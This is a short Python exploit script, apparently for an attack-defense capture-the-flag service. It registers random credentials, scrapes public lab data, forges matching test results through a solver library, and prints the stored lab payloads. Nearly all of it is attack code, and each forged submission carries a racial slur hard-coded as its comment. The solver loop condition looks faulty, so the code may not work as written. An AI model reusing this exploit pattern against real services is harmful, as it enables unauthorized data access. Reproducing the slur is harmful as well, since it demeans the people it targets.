import requests as re
from sys import argv
import secrets
import string
from math_sploit_lib import solve, calculate_error


def rnd_string(length, alphabet=None) -> str:
    if alphabet is None:
        alphabet = string.ascii_letters + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(length))


session = re.Session()
ip = argv[1]
port = 9993
url = f"http://{ip}:{port}"

creds = {
    'username': rnd_string(10),
    'password': rnd_string(10)
}


def register():
    session.post(f"{url}/user/register", data=creds)


# Here you should parse attack data
def parse_labs():
    return session.get(url, headers={'Accept': 'application/json'}).json()['publicResults']


def solveForLab(lab_data: dict):
    n = 100000
    x = 0
    percision = 0.001
    exp_res = lab_data['expected']
    while x < exp_res + 1000000 or calculate_error(x, exp_res) >= percision:
        res = solve(lab_data['expected'], percision, n)
        n += 1
        x = res[1][0] + (res[0][1] - res[0][0]) / 2
    new_lab_data = {
        'labName': 'capturing ' + lab_data['labName'],
        'testResult': x,
        'expectedResult': exp_res,
        'comment': 'nigger'
    }
    print(session.post(f"{url}/labs/new", data=new_lab_data).text)



register()
lab_array = parse_labs()

for i in range(len(lab_array)):
    solveForLab(lab_array[i])
print('Creds')
print(creds)

labs = session.get(f"{url}/labs/show", headers={'Accept':'application/json'}).json()
for i in labs['payload']:
    print(i)
